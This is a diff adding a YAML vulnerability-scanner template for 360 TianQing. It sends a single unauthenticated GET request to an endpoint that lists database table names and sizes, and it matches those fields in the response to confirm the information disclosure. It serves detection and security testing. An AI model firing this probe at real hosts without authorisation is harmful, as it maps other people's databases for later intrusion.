@@ -1,0 +1,14 @@
+name: 360 TianQing database information disclosure
+manual: true
+query: app="360-TianQing"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/dbstat/gettablessize
+    expression: response.status == 200 && response.body.bcontains(b"schema_name")
+      && response.body.bcontains(b"table_name") && response.body.bcontains(b"table_size")
+expression: r0()
+detail:
+  tags: Disclosure of Sensitive Information
